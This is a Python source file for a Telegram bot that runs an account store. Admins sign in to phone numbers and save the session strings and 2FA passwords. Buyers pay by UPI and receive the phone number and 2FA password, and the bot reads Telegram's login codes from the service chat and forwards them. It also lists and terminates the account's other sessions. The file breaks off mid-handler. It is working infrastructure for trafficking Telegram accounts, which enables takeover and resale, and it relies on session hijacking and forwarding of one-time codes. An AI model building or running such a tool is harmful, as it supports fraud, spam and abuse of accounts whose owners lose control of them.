import asyncio
import io
import os
import logging
import time
import aiosqlite
import qrcode
from dotenv import load_dotenv

from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest

# ==================== ENVIRONMENT CONFIGURATION ====================
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH")
OWNER_ID = int(os.getenv("OWNER_ID", "0"))
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "0"))

UPI_ID_TEXT = os.getenv("UPI_ID_TEXT", "yourupi@bank")
PAYEE_NAME = os.getenv("PAYEE_NAME", "Account Store")

MIN_DEPOSIT = 50.0

DB_NAME = "shop_bot.db"
logging.basicConfig(level=logging.INFO)

SUDO_USERS = set()

# ==================== DATABASE INITIALIZATION ====================
async def init_db():
    global SUDO_USERS
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                balance REAL DEFAULT 0.0,
                is_banned INTEGER DEFAULT 0
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                country TEXT,
                year TEXT,
                phone_number TEXT UNIQUE,
                session_string TEXT,
                two_fa TEXT DEFAULT 'None',
                price REAL,
                has_discount TEXT DEFAULT 'NO',
                cashback REAL DEFAULT 0.0,
                status TEXT DEFAULT 'AVAILABLE',
                sold_to INTEGER DEFAULT NULL
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS sudo_users (
                user_id INTEGER PRIMARY KEY
            )
        """)
        
        await db.execute("INSERT OR IGNORE INTO sudo_users (user_id) VALUES (?)", (OWNER_ID,))
        await db.commit()

        async with db.execute("SELECT user_id FROM sudo_users") as cursor:
            rows = await cursor.fetchall()
            SUDO_USERS = {r[0] for r in rows}
            SUDO_USERS.add(OWNER_ID)

# ==================== BOT CLIENT SETUP ====================
app = Client("ShopBotGUI", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

user_states = {}
temp_data = {}

# ==================== HELPER FUNCTIONS ====================
async def get_user_balance(user_id: int) -> float:
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            if row:
                return row[0]
            await db.execute("INSERT INTO users (user_id, balance) VALUES (?, 0.0)", (user_id,))
            await db.commit()
            return 0.0

async def is_banned(user_id: int) -> bool:
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,)) as cursor:
            row = await cursor.fetchone()
            return bool(row[0]) if row else False

async def set_user_balance(user_id: int, new_balance: float):
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute("INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, ?)", (user_id, new_balance))
        await db.commit()

async def update_balance(user_id: int, amount: float):
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
        await db.commit()

async def add_sudo_user(user_id: int):
    SUDO_USERS.add(user_id)
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute("INSERT OR IGNORE INTO sudo_users (user_id) VALUES (?)", (user_id,))
        await db.commit()

async def remove_sudo_user(user_id: int):
    if user_id == OWNER_ID:
        return
    SUDO_USERS.discard(user_id)
    async with aiosqlite.connect(DB_NAME) as db:
        await db.execute("DELETE FROM sudo_users WHERE user_id = ?", (user_id,))
        await db.commit()

async def log_to_channel(text: str):
    if LOG_CHANNEL_ID:
        try:
            await app.send_message(LOG_CHANNEL_ID, text)
        except Exception as e:
            logging.error(f"Log Channel Error: {e}")

def generate_upi_qr(upi_id: str, name: str, amount: float = None) -> io.BytesIO:
    name_encoded = name.replace(" ", "%20")
    if amount and amount > 0:
        upi_url = f"upi://pay?pa={upi_id}&pn={name_encoded}&am={amount:.2f}&cu=INR"
    else:
        upi_url = f"upi://pay?pa={upi_id}&pn={name_encoded}&cu=INR"

    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    qr.add_data(upi_url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    
    bio = io.BytesIO()
    bio.name = 'qr.png'
    img.save(bio, 'PNG')
    bio.seek(0)
    return bio

def get_account_options_keyboard(acc_id: int):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Re-fetch OTP", callback_data=f"refetch_otp_{acc_id}")],
        [InlineKeyboardButton("📱 Manage Devices", callback_data=f"manage_devs_{acc_id}")],
        [InlineKeyboardButton("🛠️ Terminate Other Sessions", callback_data=f"term_sess_{acc_id}")],
        [InlineKeyboardButton("🚪 Finish & Logout Bot", callback_data=f"logout_bot_{acc_id}")]
    ])

# ==================== OTP LISTENER ENGINE ====================
async def fetch_latest_otp(user_id: int, acc_id: int, is_manual: bool = False):
    async with aiosqlite.connect(DB_NAME) as db:
        async with db.execute("SELECT phone_number, session_string, two_fa FROM accounts WHERE id = ?", (acc_id,)) as cursor:
            row = await cursor.fetchone()

    if not row:
        await app.send_message(user_id, "❌ **Account session record not found!**")
        return

    phone_number, session_string, two_fa = row
    
    try:
        t_client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await t_client.connect()

        if not await t_client.is_user_authorized():
            await app.send_message(user_id, f"⚠️ **Account Session Expired or Closed:** `{phone_number}`")
            return

        latest_otp = None
        async for message in t_client.iter_messages(777000, limit=5):
            if message and message.text:
                latest_otp = message.text
                break

        await t_client.disconnect()

        if latest_otp:
            await app.send_message(
                user_id,
                f"📲 **NEW LOGIN OTP RECEIVED!**\n\n"
                f"**Phone:** `{phone_number}`\n"
                f"**OTP Details:**\n`{latest_otp}`\n\n"
                f"**2FA Password:** `{two_fa}`\n\n"
                f"⚠️ *Note: Ek baar OTP milne ke baad hum zimmedar nahi honge.*",
                reply_markup=get_account_options_keyboard(acc_id)
            )
        elif is_manual:
            await app.send_message(
                user_id,
                f"⌛ **No fresh OTP found yet for** `{phone_number}`. Re-send OTP in your app and click again.",
                reply_markup=get_account_options_keyboard(acc_id)
            )

    except Exception as e:
        logging.error(f"OTP Fetch Error: {e}")

async def listen_for_otp(user_id: int, phone_number: str, session_string: str, two_fa: str, acc_id: int):
    try:
        t_client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await t_client.connect()

        if not await t_client.is_user_authorized():
            await app.send_message(user_id, f"⚠️ **Account Session Expired:** `{phone_number}`")
            return

        buy_time = time.time()
        await app.send_message(
            user_id,
            f"⚡ **OTP Live Monitoring Started!**\n\n"
            f"📞 **Phone:** `{phone_number}`\n"
            f"🔑 **2FA Password:** `{two_fa}`\n\n"
            f"_Enter phone number in Telegram app. Auto-checking OTP..._",
            reply_markup=get_account_options_keyboard(acc_id)
        )

        for _ in range(30):
            await asyncio.sleep(5)
            async for message in t_client.iter_messages(777000, limit=1):
                if message and message.date:
                    msg_timestamp = message.date.timestamp()
                    if msg_timestamp >= buy_time - 5 and message.text:
                        await t_client.disconnect()
                        await fetch_latest_otp(user_id, acc_id, is_manual=False)
                        return

        await t_client.disconnect()
    except Exception as e:
        logging.error(f"OTP Listener Error: {e}")

# ==================== MAIN MENUS ====================
def get_main_menu_keyboard(user_id: int):
    buttons = [
        [InlineKeyboardButton("🛒 Buy Accounts", callback_data="user_buy_menu"), InlineKeyboardButton("💳 Deposit Money", callback_data="user_deposit_menu")],
        [InlineKeyboardButton("👤 Profile", callback_data="user_profile"), InlineKeyboardButton("👨‍💻 Support", url="https://t.me/your_admin_username")]
    ]
    if user_id in SUDO_USERS:
        buttons.append([InlineKeyboardButton("⚙️ Admin Dashboard", callback_data="admin_panel")])
    return InlineKeyboardMarkup(buttons)

def get_admin_panel_keyboard(user_id: int):
    buttons = [
        [InlineKeyboardButton("➕ Add Account Stock", callback_data="admin_add_acc"), InlineKeyboardButton("🏷️ Change Stock Price", callback_data="admin_change_price")],
        [InlineKeyboardButton("✏️ Edit User Balance", callback_data="admin_edit_bal"), InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban_user")],
        [InlineKeyboardButton("🟢 Unban User", callback_data="admin_unban_user")]
    ]
    if user_id == OWNER_ID:
        buttons.append([InlineKeyboardButton("👥 Manage Admins (Owner Only)", callback_data="admin_manage_sudo")])
    
    buttons.append([InlineKeyboardButton("🔙 Exit Admin Panel", callback_data="user_main_menu")])
    return InlineKeyboardMarkup(buttons)

# ==================== COMMAND HANDLERS ====================
@app.on_message(filters.command("start") & filters.private)
async def start_handler(client: Client, message: Message):
    user_id = message.from_user.id
    if await is_banned(user_id):
        await message.reply_text("🚫 **You are banned from using this bot.**")
        return
        
    bal = await get_user_balance(user_id)
    text = f"👋 **Welcome to the Account Store Bot!**\n\n🆔 **User ID:** `{user_id}`\n💰 **Wallet Balance:** ₹{bal:.2f}"
    await message.reply_text(text, reply_markup=get_main_menu_keyboard(user_id))

@app.on_message(filters.command("help") & filters.private)
async def help_handler(client: Client, message: Message):
    if await is_banned(message.from_user.id):
        return
    text = (
        "❓ **Bot Help & Instructions**\n\n"
        "1. **Buying Accounts:** Click **🛒 Buy Accounts**, select package & confirm.\n"
        "2. **Depositing Funds:** Click **💳 Deposit Money**, enter amount (Min ₹50).\n"
        "3. **Payment Verification:** Send payment screenshot & valid Transaction ID/UTR.\n"
        "4. **Support:** Contact admins directly via **👨‍💻 Support** button."
    )
    await message.reply_text(text)

@app.on_message(filters.command("admin") & filters.private)
async def admin_command_handler(client: Client, message: Message):
    user_id = message.from_user.id
    if user_id not in SUDO_USERS:
        await message.reply_text("🚫 **Unauthorized.** This command is restricted to admins.")
        return
    await message.reply_text("⚙️ **Welcome to the Admin Panel**", reply_markup=get_admin_panel_keyboard(user_id))

# ==================== CALLBACK ROUTER ====================
@app.on_callback_query()
async def callback_router(client: Client, query: CallbackQuery):
    user_id = query.from_user.id
    data = query.data

    if await is_banned(user_id):
        await query.answer("🚫 You are banned!", show_alert=True)
        return

    if data == "user_main_menu":
        user_states.pop(user_id, None)
        bal = await get_user_balance(user_id)
        await query.message.edit_text(f"👋 **Main Menu**\n\n💰 **Balance:** ₹{bal:.2f}", reply_markup=get_main_menu_keyboard(user_id))

    elif data == "user_profile":
        bal = await get_user_balance(user_id)
        await query.message.edit_text(
            f"👤 **Your Profile**\n\n🆔 **ID:** `{user_id}`\n💵 **Wallet Balance:** ₹{bal:.2f}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="user_main_menu")]])
        )

    elif data == "user_buy_menu":
        async with aiosqlite.connect(DB_NAME) as db:
            async with db.execute(
                "SELECT country, year, price, has_discount, cashback, COUNT(*) FROM accounts WHERE status = 'AVAILABLE' GROUP BY country, year, price, has_discount, cashback"
            ) as cursor:
                stocks = await cursor.fetchall()

        if not stocks:
            await query.answer("❌ Currently Out of Stock!", show_alert=True)
            return

        buttons = []
        for country, year, price, has_discount, cb, count in stocks:
            btn_label = f"🌐 {country} ({year}) - ₹{price} | Stock: {count}"
            if has_discount == "YES" and cb > 0:
                btn_label += f" (🎁+₹{cb})"
            buttons.append([InlineKeyboardButton(btn_label, callback_data=f"buy_pkg_{country}_{year}_{price}")])
        
        buttons.append([InlineKeyboardButton("🔙 Back", callback_data="user_main_menu")])
        await query.message.edit_text("🌍 **Select an Account Package:**", reply_markup=InlineKeyboardMarkup(buttons))

    elif data.startswith("buy_pkg_"):
        _, _, country, year, price = data.split("_")
        price = float(price)

        async with aiosqlite.connect(DB_NAME) as db:
            await db.execute("BEGIN IMMEDIATE")
            async with db.execute(
                "SELECT id, phone_number, session_string, two_fa, has_discount, cashback FROM accounts WHERE country = ? AND year = ? AND price = ? AND status = 'AVAILABLE' LIMIT 1",
                (country, year, price)
            ) as cursor:
                acc = await cursor.fetchone()

            if not acc:
                await db.rollback()
                await query.answer("❌ Item is out of stock!", show_alert=True)
                return

            acc_id, phone, session_str, two_fa, has_discount, cashback = acc
            bal = await get_user_balance(user_id)

            if bal < price:
                await db.rollback()
                await query.answer(f"❌ Insufficient Balance! Required: ₹{price}, Available: ₹{bal:.2f}", show_alert=True)
                return

            await db.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (price, user_id))
            await db.execute("UPDATE accounts SET status = 'SOLD', sold_to = ? WHERE id = ?", (user_id, acc_id))
            
            cashback_credited = 0.0
            if has_discount == "YES" and cashback > 0:
                await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (cashback, user_id))
                cashback_credited = cashback

            await db.commit()

        msg = f"✅ **Purchase Successful!**\n\n" \
              f"🌍 **Country:** {country} ({year})\n" \
              f"📞 **Phone Number:** `{phone}`\n" \
              f"🔑 **2FA Password:** `{two_fa}`\n" \
              f"💵 **Price Paid:** ₹{price}\n"
        if cashback_credited > 0:
            msg += f"🎁 **Cashback Added:** +₹{cashback_credited:.2f} credited to wallet!\n"

        await query.message.edit_text(msg, reply_markup=get_account_options_keyboard(acc_id))

        await log_to_channel(
            f"🛍️ **NEW PURCHASE LOG**\n\n"
            f"👤 **User ID:** `{user_id}`\n"
            f"🌍 **Account:** {country} ({year})\n"
            f"💵 **Price:** ₹{price}\n"
            f"🎁 **Cashback Given:** ₹{cashback_credited}"
        )

        asyncio.create_task(listen_for_otp(user_id, phone, session_str, two_fa, acc_id))

    elif data.startswith("refetch_otp_"):
        acc_id = int(data.split("_")[2])
        await query.answer("🔄 Re-fetching latest OTP...", show_alert=False)
        await fetch_latest_otp(user_id, acc_id, is_manual=True)

    elif data.startswith("manage_devs_"):
        acc_id = int(data.split("_")[2])
        await query.answer("📱 Fetching active devices...", show_alert=False)

        async with aiosqlite.connect(DB_NAME) as db:
            async with db.execute("SELECT session_string, phone_number FROM accounts WHERE id = ?", (acc_id,)) as cursor:
                row = await cursor.fetchone()

        if row:
            session_str, phone = row
            try:
                t_client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
                await t_client.connect()
                authorizations = await t_client(GetAuthorizationsRequest())
                await t_client.disconnect()

                buttons = []
                for auth in authorizations.authorizations:
                    # Non-current sessions get individual termination buttons
                    if not auth.current:
                        device_label = f"❌ Remove: {auth.device_model} ({auth.app_name})"
                        buttons.append([InlineKeyboardButton(device_label, callback_data=f"del_dev_{acc_id}_{auth.hash}")])
                    else:
                        buttons.append([InlineKeyboardButton(f"🟢 Current: {auth.device_model} (Bot)", callback_data="none")])

                buttons.append([InlineKeyboardButton("🔙 Back to Options", callback_data=f"back_acc_opt_{acc_id}")])

                await query.message.reply_text(
                    f"📱 **Active Devices for** `{phone}`:\n\nClick any device to terminate session:",
                    reply_markup=InlineKeyboardMarkup(buttons)
                )

            except Exception as e:
                await query.message.reply_text(f"⚠️ Failed to list devices: `{e}`")

    elif data.startswith("del_dev_"):
        _, _, acc_id, auth_hash = data.split("_")
        acc_id = int(acc_id)
        auth_hash = int(auth_hash)

        async with aiosqlite.connect(DB_NAME) as db:
            async with db.execute("SELECT session_string FROM accounts WHERE id = ?", (acc_id,)) as cursor:
                row = await cursor.fetchone()

        if row:
            try:
                t_client = TelegramClient(StringSession(row[0]), API_ID, API_HASH)
                await t_client.connect()
                await t_client(ResetAuthorizationRequest(hash=auth_hash))
                await t_client.disconnect()
                await query.answer("✅ Device removed successfully!", show_alert=True)
            except Exception as e:
                await query.answer(f"❌ Device remove failed: {e}", show_alert=True)

    elif data.startswith("term_sess_"):
        acc_id = int(data.split("_")[2])
        await query.answer("⏳ Terminating all other sessions...", show_alert=True)

        async with aiosqlite.connect(DB_NAME) as db:
            async with db.execute("SELECT session_string FROM accounts WHERE id = ?", (acc_id,)) as cursor:
                row = await cursor.fetchone()

        if row:
            session_str = row[0]
            try:
                t_client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
                await t_client.connect()
                await t_client.reset_authorization(0)
                await t_client.disconnect()
                await query.message.reply_text("✅ **All other active devices terminated! Only your current device session remains.**")
            except Exception as e:
                await query.message.reply_text(f"⚠️ **Notice:** Failed to terminate sessions. Reason: `{e}`")

    elif data.startswith("logout_bot_"):
        acc_id = int(data.split("_")[2])
        await query.answer("🚪 Logging out bot session...", show_alert=True)

        async with aiosqlite.connect(DB_NAME) as db:
            async with db.execute("SELECT session_string FROM accounts WHERE id = ?", (acc_id,)) as cursor:
                row = await cursor.fetchone()

        if row:
            try:
                t_client = TelegramClient(StringSession(row[0]), API_ID, API_HASH)
                await t_client.connect()
                await t_client.log_out()
                await query.message.reply_text("🚪 **Finish & Logout Complete! Bot session successfully deleted.**")
            except Exception as e:
                await query.message.reply_text(f"⚠️ Session already closed or error: `{e}`")

    elif data.startswith("back_acc_opt_"):
        acc_id = int(data.split("_")[3])
        await query.message.edit_text("🛠️ **Account Options Panel:**", reply_markup=get_account_options_keyboard(acc_id))

    elif data == "user_deposit_menu":
        user_states[user_id] = "WAIT_DEPOSIT_AMOUNT_INPUT"
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="user_main_menu")]])
        await query.message.edit_text(
            f"💳 **ADD MONEY TO WALLET**\n\n"
            f"⚠️ **Minimum Deposit:** ₹{MIN_DEPOSIT:.2f}\n\n"
            f"🔢 **Enter the amount (₹) you want to deposit:**",
            reply_markup=kb
        )

    # ADMIN HANDLERS
    elif data == "admin_panel":
        if user_id not in SUDO_USERS: return
        await query.message.edit_text("⚙️ **Admin Dashboard**", reply_markup=get_admin_panel_keyboard(user_id))

    elif data == "admin_add_acc":
        if user_id not in SUDO_USERS: return
        user_states[user_id] = "ADM_STEP_COUNTRY"
        await query.message.edit_text("📝 **Step 1:** Enter the Country Name (e.g., `India`, `USA`):")

    elif data == "admin_change_price":
        if user_id not in SUDO_USERS: return
        async with aiosqlite.connect(DB_NAME) as db:
            async with db.execute(
                "SELECT country, year, price, COUNT(*) FROM accounts WHERE status = 'AVAILABLE' GROUP BY country, year, price"
            ) as cursor:
                stocks = await cursor.fetchall()

        if not stocks:
            await query.answer("❌ No active stock found to edit prices!", show_alert=True)
            return

        buttons = []
        for country, year, current_price, count in stocks:
            btn_label = f"🌐 {country} ({year}) | Current: ₹{current_price} | Qty: {count}"
            buttons.append([InlineKeyboardButton(btn_label, callback_data=f"adm_chgprice_{country}_{year}_{current_price}")])
        
        buttons.append([InlineKeyboardButton("🔙 Back", callback_data="admin_panel")])
        await query.message.edit_text("🏷️ **Select Stock Category to Change Price:**", reply_markup=InlineKeyboardMarkup(buttons))

    elif data.startswith("adm_chgprice_"):
        if user_id not in SUDO_USERS: return
        _, _, country, year, old_price = data.split("_")
        temp_data[user_id] = {"country": country, "year": year, "old_price": float(old_price)}
        user_states[user_id] = "ADM_STEP_NEW_STOCK_PRICE"
        await query.message.edit_text(f"💵 **Category:** {country} ({year})\n**Current Price:** ₹{old_price}\n\nEnter the **New Price (₹)** for this category:")

    elif data == "admin_edit_bal":
        if user_id not in SUDO_USERS: return
        user_states[user_id] = "ADM_STEP_BAL_USER"
        await query.message.edit_text("👤 **Enter Target User ID or @Username:**")

    elif data == "admin_manage_sudo":
        if user_id != OWNER_ID:
            await query.answer("🚫 Only Owner can access Sudo settings!", show_alert=True)
            return
        
        admin_list_text = "\n".join([f"• `{sudo}`" + (" 👑 (Owner)" if sudo == OWNER_ID else "") for sudo in SUDO_USERS])
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Add New Admin", callback_data="admin_add_sudo_step"), InlineKeyboardButton("➖ Remove Admin", callback_data="admin_rem_sudo_step")],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]
        ])
        await query.message.edit_text(
            f"👥 **Current Sudo Admin List:**\n\n{admin_list_text}\n\nSelect an option below to manage admins.",
            reply_markup=kb
        )

    elif data == "admin_add_sudo_step":
        if user_id != OWNER_ID: return
        user_states[user_id] = "ADM_STEP_ADD_SUDO"
        await query.message.edit_text("👤 **Enter User ID or @username to make Admin:**")

    elif data == "admin_rem_sudo_step":
        if user_id != OWNER_ID: return
        user_states[user_id] = "ADM_STEP_REM_SUDO"
        await query.message.edit_text("👤 **Enter User ID or @username to remove Admin privileges:**")

    elif data == "admin_ban_user":
        if user_id not in SUDO_USERS: return
        user_states[user_id] = "ADM_STEP_BAN_USER"
        await query.message.edit_text("🚫 **Enter User ID or @Username to Ban:**")

    elif data == "admin_unban_user":
        if user_id not in SUDO_USERS: return
        user_states[user_id] = "ADM_STEP_UNBAN_USER"
        await query.message.edit_text("🟢 **Enter User ID or @Username to Unban:**")

    elif data in ["adm_disc_YES", "adm_disc_NO"]:
        if user_id not in SUDO_USERS: return
        choice = data.split("_")[2]
        temp_data[user_id]["has_discount"] = choice
        
        if choice == "YES":
            user_states[user_id] = "ADM_STEP_CASHBACK_VAL"
            await query.message.edit_text("🎁 **Enter Cashback Amount (e.g., 20):**")
        else:
            temp_data[user_id]["cashback"] = 0.0
            user_states[user_id] = "ADM_STEP_PHONE"
            await query.message.edit_text("📞 **Enter Account Phone Number (with Country Code e.g. `+1234567890`):**")

    # PRIVATE ADMIN DM APPROVAL / REJECTION HANDLERS
    elif data.startswith("adm_app_dep_"):
        if user_id not in SUDO_USERS:
            await query.answer("🚫 Only Sudo Admins can approve deposits!", show_alert=True)
            return

        parts = data.split("_")
        dep_user_id = int(parts[3])
        amount = float(parts[4])

        await update_balance(dep_user_id, amount)
        admin_mention = query.from_user.mention
        await query.message.edit_caption(caption=query.message.caption + f"\n\n✅ **APPROVED (+₹{amount:.2f})** by {admin_mention}")
        await app.send_message(dep_user_id, f"🎉 **Deposit Approved!** ₹{amount:.2f} credited to your wallet.")
        
        await log_to_channel(f"✅ **DEPOSIT APPROVED**\n👤 User: `{dep_user_id}`\n💵 Amount: ₹{amount:.2f}\n👨‍💻 Approved By: {admin_mention}")

    elif data.startswith("adm_rej_dep_"):
        if user_id not in SUDO_USERS:
            await query.answer("🚫 Only Sudo Admins can reject deposits!", show_alert=True)
            return

        dep_user_id = int(data.split("_")[3])
        admin_mention = query.from_user.mention
        await query.message.edit_caption(caption=query.message.caption + f"\n\n❌ **REJECTED** by {admin_mention}")
        await app.send_message(dep_user_id, "❌ Your deposit request was rejected by Admin.")
        
        await log_to_channel(f"❌ **DEPOSIT REJECTED**\n👤 User: `{dep_user_id}`\n👨‍💻 Rejected By: {admin_mention}")

# ==================== PHOTO RECEIVER ====================
@app.on_message(filters.photo & filters.private)
async def photo_receiver(client: Client, message: Message):
    user_id = message.from_user.id
    if user_states.get(user_id) == "WAIT_DEPOSIT_PHOTO":
        temp_data[user_id]["photo_id"] = message.photo.file_id
        user_states[user_id] = "WAIT_DEPOSIT_TXN_ID"
        await message.reply_text(
            "🧾 **Now enter the Transaction ID / UTR Number:**\n\n"
            "Examples:\n"
            "• PhonePe / GPay / Paytm: `3245XXXXXXXX` (12 digits)\n"
            "• FamPay: `FPXXXXXXXXXX` or 12-digit Ref No."
        )

# ==================== STEP-BY-STEP INPUT ROUTER ====================
@app.on_message(filters.text & filters.private & ~filters.command(["start", "help", "admin"]))
async def text_router(client: Client, message: Message):
    user_id = message.from_user.id
    state = user_states.get(user_id)

    if not state:
        return

    if state == "WAIT_DEPOSIT_AMOUNT_INPUT":
        try:
            amount = float(message.text.strip())
            if amount < MIN_DEPOSIT:
                await message.reply_text(f"❌ **Minimum Deposit limit is ₹{MIN_DEPOSIT:.2f}.** Please enter an amount equal to or greater than ₹{MIN_DEPOSIT:.2f}:")
                return

            temp_data[user_id] = {"amount": amount}
            user_states[user_id] = "WAIT_DEPOSIT_PHOTO"
            
            qr_image = generate_upi_qr(UPI_ID_TEXT, PAYEE_NAME, amount)
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel Deposit", callback_data="user_main_menu")]])
            
            deposit_text = (
                f"💳 **ADD MONEY TO WALLET**\n\n"
                f"💵 **Requested Amount:** ₹{amount:.2f}\n"
                f"🔹 **UPI ID:** `{UPI_ID_TEXT}` (Tap to Copy)\n"
                f"🔹 **Payee Name:** {PAYEE_NAME}\n\n"
                f"📌 **Instructions:**\n"
                f"1️⃣ Scan QR Code or send exactly ₹{amount:.2f} to UPI ID.\n"
                f"2️⃣ Send the **Payment Screenshot** right here in this chat."
            )

            await app.send_photo(
                chat_id=user_id,
                photo=qr_image,
                caption=deposit_text,
                reply_markup=kb
            )
        except ValueError:
            await message.reply_text("❌ Invalid input! Please enter numbers only (e.g., 50 or 100):")

    elif state == "WAIT_DEPOSIT_TXN_ID":
        txn_id = message.text.strip()
        data = temp_data[user_id]
        photo_id = data["photo_id"]
        amount = data["amount"]
        user_states.pop(user_id, None)

        await message.reply_text("⏳ **Deposit proof submitted! Admins are verifying your payment.**")
        
        kb = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("✅ Approve", callback_data=f"adm_app_dep_{user_id}_{amount}"),
                InlineKeyboardButton("❌ Reject", callback_data=f"adm_rej_dep_{user_id}")
            ]
        ])

        deposit_caption = (
            f"📥 **NEW DEPOSIT VERIFICATION REQUEST**\n\n"
            f"👤 **User:** {message.from_user.mention} (`{user_id}`)\n"
            f"💵 **Amount:** ₹{amount:.2f}\n"
            f"🧾 **Transaction ID / UTR:** `{txn_id}`"
        )

        for sudo_id in SUDO_USERS:
            try:
                await app.send_photo(
                    chat_id=sudo_id,
                    photo=photo_id,
                    caption=deposit_caption,
                    reply_markup=kb
                )
            except Exception as e:
                logging.error(f"Failed to send DM to Admin {sudo_id}: {e}")

    elif state == "ADM_STEP_NEW_STOCK_PRICE":
        try:
            new_price = float(message.text.strip())
            category_info = temp_data[user_id]
            
            async with aiosqlite.connect(DB_NAME) as db:
                await db.execute(
                    "UPDATE accounts SET price = ? WHERE country = ? AND year = ? AND price = ? AND status = 'AVAILABLE'",
                    (new_price, category_info["country"], category_info["year"], category_info["old_price"])
                )
                await db.commit()
            
            user_states.pop(user_id, None)
            await message.reply_text(
                f"✅ **Stock Price Updated Successfully!**\n\n"
                f"🌍 **Category:** {category_info['country']} ({category_info['year']})\n"
                f"💵 **New Price:** ₹{new_price:.2f}",
                reply_markup=get_admin_panel_keyboard(user_id)
            )
        except ValueError:
            await message.reply_text("❌ Please enter numbers only:")

    elif state == "ADM_STEP_COUNTRY":
        temp_data[user_id] = {"country": message.text.strip()}
        user_states[user_id] = "ADM_STEP_YEAR"
        await message.reply_text("📅 **Step 2:** Enter Account Creation Year (e.g. `2022`, `2024`):")

    elif state == "ADM_STEP_YEAR":
        temp_data[user_id]["year"] = message.text.strip()
        user_states[user_id] = "ADM_STEP_PRICE"
        await message.reply_text("💵 **Step 3:** Enter Account Price (₹):")

    elif state == "ADM_STEP_PRICE":
        try:
            temp_data[user_id]["price"] = float(message.text.strip())
            user_states[user_id] = "ADM_STEP_DISCOUNT_OPTION"
            
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ YES (Enable Discount)", callback_data="adm_disc_YES")],
                [InlineKeyboardButton("❌ NO (No Discount)", callback_data="adm_disc_NO")]
            ])
            await message.reply_text("🎁 **Do you want to enable Cashback/Discount on this account?**", reply_markup=kb)
        except ValueError:
            await message.reply_text("❌ Please enter numbers only:")

    elif state == "ADM_STEP_CASHBACK_VAL":
        try:
            temp_data[user_id]["cashback"] = float(message.text.strip())
            user_states[user_id] = "ADM_STEP_PHONE"
            await message.reply_text("📞 **Enter Account Phone Number (with country code e.g. `+1234567890`):**")
        except ValueError:
            await message.reply_text("❌ Please enter numbers only:")

    elif state == "ADM_STEP_PHONE":
        temp_data[user_id]["phone"] = message.text.strip()
        user_states[user_id] = "ADM_STEP_2FA"
        await message.reply_text("🔑 **Enter 2FA Password (If none, type `None`):**")

    elif state == "ADM_STEP_2FA":
        temp_data[user_id]["two_fa"] = message.text.strip()
        phone = temp_data[user_id]["phone"]

        await message.reply_text(f"⏳ Triggering Telegram OTP request to `{phone}`... Check your Telegram App.")

        t_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await t_client.connect()
        await t_client.send_code_request(phone)

        temp_data[user_id]["client"] = t_client
        user_states[user_id] = "ADM_STEP_OTP"
        await message.reply_text("📲 **Enter Telegram OTP code received:**")

    elif state == "ADM_STEP_OTP":
        otp = message.text.strip()
        data = temp_data[user_id]
        t_client = data["client"]
        
        try:
            try:
                await t_client.sign_in(data["phone"], otp)
            except SessionPasswordNeededError:
                if data["two_fa"] and data["two_fa"] != "None":
                    await t_client.sign_in(password=data["two_fa"])
                else:
                    await message.reply_text("❌ **2FA Password Required!**")
                    await t_client.disconnect()
                    return

            session_str = t_client.session.save()
            await t_client.disconnect()

            async with aiosqlite.connect(DB_NAME) as db:
                await db.execute("""
                    INSERT OR REPLACE INTO accounts 
                    (country, year, price, has_discount, cashback, phone_number, session_string, two_fa, status)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'AVAILABLE')
                """, (data["country"], data["year"], data["price"], data["has_discount"], data["cashback"], data["phone"], session_str, data["two_fa"]))
                await db.commit()

            user_states.pop(user_id, None)
            await message.reply_text(f"✅ **Account Added / Updated in Stock!**\n\n🌍 {data['country']} ({data['year']})\n📞 `{data['phone']}`", reply_markup=get_admin_panel_keyboard(user_id))

        except Exception as e:
            await message.reply_text(f"❌ Error during sign in: `{e}`")

    elif state == "ADM_STEP_BAL_USER":
        input_text = message.text.strip()
        try:
            target_user = (await client.get_users(input_text)).id
            temp_data[user_id] = {"target_user": target_user}
            user_states[user_id] = "ADM_STEP_BAL_NEW_VAL"
            await message.reply_text(f"💵 Target User ID: `{target_user}`\nEnter the new **Exact Balance (₹)**:")
        except Exception:
